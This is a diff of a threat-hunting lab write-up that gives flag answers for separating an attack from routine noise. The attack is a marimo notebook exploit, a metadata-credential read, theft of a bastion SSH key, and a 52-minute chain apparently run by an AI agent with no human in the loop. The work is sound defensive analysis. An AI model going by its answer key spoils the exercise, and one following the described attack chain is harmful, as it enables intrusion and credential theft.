+- **Discovery:** 74 copies of `python3.12` started on the notebook server in this window: 72 quick developer commands launched from a shell, one launched by the system, and the attacker's. They share the same program name, the same user, and overlapping times. Nothing about the program itself stands out.
 
-  Grouping by parent command line splits them cleanly into three, and the attacker's is the only one parented by the marimo launch line. A web application spawning an interpreter is the lineage that separates exploit-driven execution from a developer at a shell.
+  Grouping by the parent program splits them into three groups, and only the attacker's was started by marimo. A web tool launching a program is what separates an attack from a developer typing a command.
 
-  Lineage also survives payload changes. The attacker can swap Python for any other interpreter, but if the entry point is still a notebook kernel endpoint, the parent remains marimo. The binary name is a commodity indicator; the parent is behavioural.
+  This still works if the attacker changes tactics. They could use a different program instead of Python, but as long as they come in through the notebook, the parent is still marimo. The program name is easy to change; the parent is not.
 
 ```kql
 LinuxProcess_CL
@@ -526,11 +536,11 @@ LinuxProcess_CL
 
 ### 🏁 Section 8, Flag 2 – Real or Noise: the Metadata-Service Reads
 - **Answer:** `ActingProcessName` = `python3.12`
-- **Discovery:** 86 connections reached `169.254.169.254` in this window. 85 came from a credential-helper daemon named `refresh`, polling routinely to keep instance credentials current. One came from `python3.12`.
+- **Discovery:** 86 connections went to the metadata service (`169.254.169.254`). 85 came from a background program called `refresh`, whose job is to keep the server's login details up to date. One came from `python3.12`.
 
-  The destination address is worthless as a discriminator here. Every instance on this estate talks to the metadata service; that is how cloud servers obtain credentials at all. An alert on the address produces 85 false positives for one true hit, and an analyst who sees it 85 times stops reading it.
+  The destination tells you nothing here. Every server talks to the metadata service; it is how cloud servers get their login details. An alert on the address would fire 85 times for nothing and once for real, and people learn to ignore alerts like that.
 
-  The anomaly is that a *notebook interpreter* requested instance credentials. The credential helper has a standing reason to be there. Code submitted through a notebook kernel does not.
+  What stands out is *who* asked. The `refresh` program has a reason to be there. Code run through the notebook does not.
 
 ```kql
 LinuxNetwork_CL
@@ -546,13 +556,18 @@ LinuxNetwork_CL
 
 ### 🏁 Section 8, Flag 3 – Real or Noise: the Secret Reads
 - **Answer:** source network and target secret — `SourceIpAddress` = `203.0.113.142` (the rotating pool) and SecretId = `prod/bastion/ssh-deploy-key`. Equivalently, `UserIdentityArn` = `arn:aws:iam::402913776148:user/svc-notebook`, which is the identity behind that address.
-- **Discovery:** 22 successful `GetSecretValue` calls appear in this window and all 22 share the same shape — read-write, successful — so `ReadOnly=false` cannot separate them here even though it isolated the theft within the attacker's own session in Section 4.
+- **Discovery:** 22 successful `GetSecretValue` calls happened in this window, and on the surface they all look the same: each one took a secret and succeeded. So the `ReadOnly = false` check from Section 4 cannot separate them here.
 
-  A useful negative result: `UserAgent` is `python-httpx/0.27.0` on **every one of the 22**, legitimate and hostile alike. The estate's own notebook application uses the same HTTP client, so the user agent is not the automation tell it initially appeared to be. An indicator that looks damning in isolation can be baseline once the baseline is actually pulled.
+  One thing I checked and ruled out: the `UserAgent` (the software making the request) is `python-httpx/0.27.0` on **all 22**. Greenfield's own app uses the same software, so it is not a sign of the attacker. Something can look suspicious on its own and turn out to be normal once you compare it with everything else.
 
-  Multi-dimensional discrimination is what works. The 21 routine calls all originate from a single internal CI address, `10.6.0.12`, under `assumed-role/app-role/notebook-app` — short-lived STS credentials the application obtains automatically — and they target operational secrets. The theft came from `203.0.113.142`, a member of the rotating Workers pool, under the long-lived IAM user `svc-notebook` lifted from the metadata service, and it targeted a bastion SSH deploy key.
+  Two things do separate them:
 
-  Either the source network or the credential type identifies the caller, and the secret identifies the objective. Neither alone is conclusive; together they are. No web application has reason to fetch a lateral-movement credential.
+  | | 21 normal calls | The theft |
+  |---|---|---|
+  | **Where from** | one internal address, `10.6.0.12`, using the app's temporary auto-issued login | `203.0.113.142`, one of the attacker's six addresses, using the stolen `svc-notebook` login |
+  | **Which secret** | everyday app secrets | the SSH key for the security gate |
+
+  Either fact alone is a strong hint; together they are conclusive. No web app has a reason to fetch a key to the security gate.
 
 ```kql
 AWSCloudTrail
@@ -569,11 +584,11 @@ AWSCloudTrail
 
 ### 🏁 Section 8, Flag 4 – Real or Noise: the Pace of the Whole Chain
 - **Answer:** Continuous — roughly **52 minutes**, start to finish.
-- **Discovery:** The estate's routine activity is scattered across the working day, as human and scheduled work is. The `deploy` account's legitimate commands on the bastion run from 03:26 to 13:52 in bursts, with gaps of twenty minutes, an hour, and nothing overnight. People start things, walk away, and return.
+- **Discovery:** Normal activity is spread across the day, as human and scheduled work usually is. The `deploy` account's normal commands on the security gate run from 03:26 to 13:52 in bursts, with gaps of twenty minutes, an hour, and nothing overnight. People start something, walk away, and come back.
 
-  The attacker's chain has no such gaps. From the WebSocket connect at 11:05:02 to transfer complete at 11:57:00 it runs unbroken through six phases — exploitation, credential theft, evasion, collection, lateral movement, exfiltration — with no idle period at any boundary. Nobody pauses to read output, decide, look something up, or get a coffee.
+  The attack has no gaps. From the first connection at 11:05:02 to the transfer finishing at 11:57:00, it runs straight through every stage (getting in, stealing logins, dodging blocks, taking the key, moving to the security gate, copying the data) without a single pause. Nobody stops to read, think, look something up, or grab a coffee.
 
-  Temporal density is itself the indicator, and it is the strongest single support for the human-tasked verdict: one instruction at the start, then fifty-two uninterrupted minutes with no human in the loop.
+  That constant pace is itself a clue, and it is the strongest support for the human-tasked verdict: one instruction at the start, then 52 minutes with no person involved.
 
 ```kql
 LLMAgentLogs_CL
